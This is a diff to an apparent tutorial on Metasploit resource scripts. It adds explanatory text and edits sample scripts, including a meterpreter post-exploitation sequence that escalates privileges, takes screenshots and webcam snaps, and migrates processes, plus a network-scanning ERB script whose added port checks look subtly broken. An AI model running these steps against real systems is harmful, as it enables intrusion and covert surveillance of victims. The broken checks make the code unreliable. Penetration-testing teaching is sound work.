@@ -6,7 +6,7 @@
 
 | article chapters | jump links | command syntax |
 |-------|---|---|
-| what are resource files? | [metasploit resource scripts](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#how-to-run-resource-scripts) | msfconsole -x 'help grep resource' |
+| what are resource files? | [metasploit resource scripts](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#what-are-resource-files) | msfconsole -x 'grep -m 1 resource help' |
 | how to run resource scripts?| [how to run resource scripts](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#how-to-run-resource-scripts) | msfconsole -r script.rc |
 | how to write resource scripts? | [how to write resource scripts](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#how-to-write-resource-scripts) | makerc /root/script.rc | 
 | RC scripts in post exploitation | [resource scripts in post exploitation](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#resource-scripts-in-post-exploitation) | run migrate -n explorer.exe |
@@ -22,13 +22,24 @@
 - [Msfconsole Core Commands](https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/)
 - [Meterpreter Core Commands](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)
 - [My Metasploit API Cheat Sheet](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit-API/my-API-Cheat-sheet.md)
+- [Rapid7 automating the metasploit console](https://blog.rapid7.com/2010/03/22/automating-the-metasploit-console/)
 - [Offensiveinfosec Writing Resource Scripts](https://offensiveinfosec.wordpress.com/2012/04/08/writing-resource-scripts-for-the-metasploit-framework/)
 - [INURLBR - metasploit automatizacao resource files](http://blog.inurl.com.br/2015/02/metasploit-automatizacao-resource-files_23.html)
 
 ---
 
+<br /><br /><br />
 
-Before you can run a resource script, you need to identify the required parameters that need to be configured for the script to run
+## WHAT ARE RESOURCE FILES
+The Metasploit Console (msfconsole) has supported the concept of resource files for quite some time. A resource file is essentially a batch script for Metasploit; using these files you can automate common tasks. If you create a resource script called ~/.msf3/msfconsole.rc, it will automatically load each time you start the msfconsole interface. This is a great way to automatically connect to a database and set common parameters (setg PAYLOAD, etc). Until this morning, however, resource scripts were limited to simple console commands.
+
+As of revision r8876, blocks of Ruby code can now be directly inserted into the resource scripts. This turns resource scripts into a generic automation platform for the Metasploit Framework.
+
+**WARNING: Before you can run a resource script, you need to identify the required parameters that need to be configured for the script to run**
+
+#### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)
+
+---
 
 <br /><br /><br />
 
@@ -141,6 +152,7 @@ Open your text editor and copy/past the follow metasploit commands to it, save f
    getprivs
    getsystem
    screenshot
+   webcan_snap -v false
    migrate -n wininit.exe
      use post/windows/gather/enum_applications
    run
@@ -324,7 +336,7 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
       print_line(help)
       Rex::sleep(1.5)
 
-      run_single("db_nmap -sV -Pn -T4 -p 21,80,445 --script=http-headers.nse,smb-os-discovery.nse --open 192.168.1.0/24")
+      run_single("db_nmap -sV -Pn -T4 -O -p 21,80,445 --script=http-headers.nse,smb-os-discovery.nse --open 192.168.1.0/24")
       run_single("services")
       print_good("## Reading msfdb database.")
       xhost = framework.db.hosts.map(&:address).join(' ')
@@ -332,6 +344,7 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
       run_single("setg RHOSTS #{xhost}")
 
          if xport =~ /21/i
+              next if (xport != 21)
               print_status("## Target port: 21 ftp found")
               run_single("use auxiliary/scanner/ftp/ftp_version")
               run_single("exploit")
@@ -340,6 +353,7 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
          end
 
          if xport =~ /445/i
+              next if (xport != 445)
               print_status("## Target port: 445 smb found")
               run_single("use auxiliary/scanner/smb/smb_version")
               run_single("exploit")
@@ -350,6 +364,7 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
          end
 
          if xport =~ /80/i
+              next if (xport != 80)
               print_status("## Target port: 80 http found")
               run_single("use auxiliary/scanner/http/title")
               run_single("exploit")
